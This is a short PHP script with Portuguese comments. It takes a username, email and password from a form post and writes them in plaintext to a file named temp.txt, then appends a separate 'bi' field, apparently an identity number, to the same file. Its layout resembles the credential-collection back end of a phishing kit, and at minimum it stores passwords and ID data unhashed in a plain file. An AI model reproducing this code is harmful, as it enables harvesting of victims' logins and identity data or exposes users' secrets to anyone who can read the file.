<?php
$filename = "temp.txt";
if (isset($_POST['username']) && isset($_POST['email']) && isset($_POST['password'])) {
    $file = fopen($filename, 'w');

    if ($file) {
        fwrite($file, $_POST['username'] . "\n");
        fwrite($file, $_POST['email'] . "\n");
        fwrite($file, $_POST['password'] . "\n");
        fclose($file);
        echo true;
    } else {
        echo '';
    }
} elseif (isset($_POST['bi'])) {
    $file = fopen($filename, 'a'); // 'a' para adicionar ao arquivo
    fwrite($file, $_POST['bi'] . "\n");
    fclose($file);
    echo true;
} else {
    echo "<script>window.location.href = 'index.php';</script>";
}
?>
